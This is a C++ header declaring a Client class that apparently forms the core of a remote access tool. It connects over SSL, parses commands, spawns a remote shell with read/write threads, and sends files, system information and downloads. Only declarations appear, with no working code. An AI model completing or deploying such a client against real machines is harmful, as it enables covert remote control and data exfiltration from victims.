#ifndef __CLIENT
#define __CLIENT
#include "headers.hpp"
#include "HttpDownload.hpp"

class Client: public Downloader{
	private:
		std::mutex mtxMutex;
		SSL_CTX *sslCTX = nullptr;
		BIO *bioRemote = nullptr;
	public:
		SSL *sslSocket = nullptr;
		volatile bool isKeepRunning = true;
		volatile bool isRunningShell = false;
		bool isRetry = false;
		bool Connect(c_char*, c_char*);
		void CloseConnection();
		bool CheckSslReturnCode(int);
		~Client(){
			if(sslCTX){
				SSL_CTX_free(sslCTX);
				sslCTX = nullptr;
			}
			sslSocket = nullptr;
			if(bioRemote){
				BIO_free_all(bioRemote);
				bioRemote = nullptr;
			}
		}
		bool ParseCommand(char*&);
		void SpawnShell(const std::string);
		void threadReadShell(HANDLE);
		void threadWriteShell(HANDLE);
	    int SendError(const char*);
		bool SendFile(const std::string);
		bool SendInfo();
		void RetrieveFile(u64, const std::string);
};

#endif
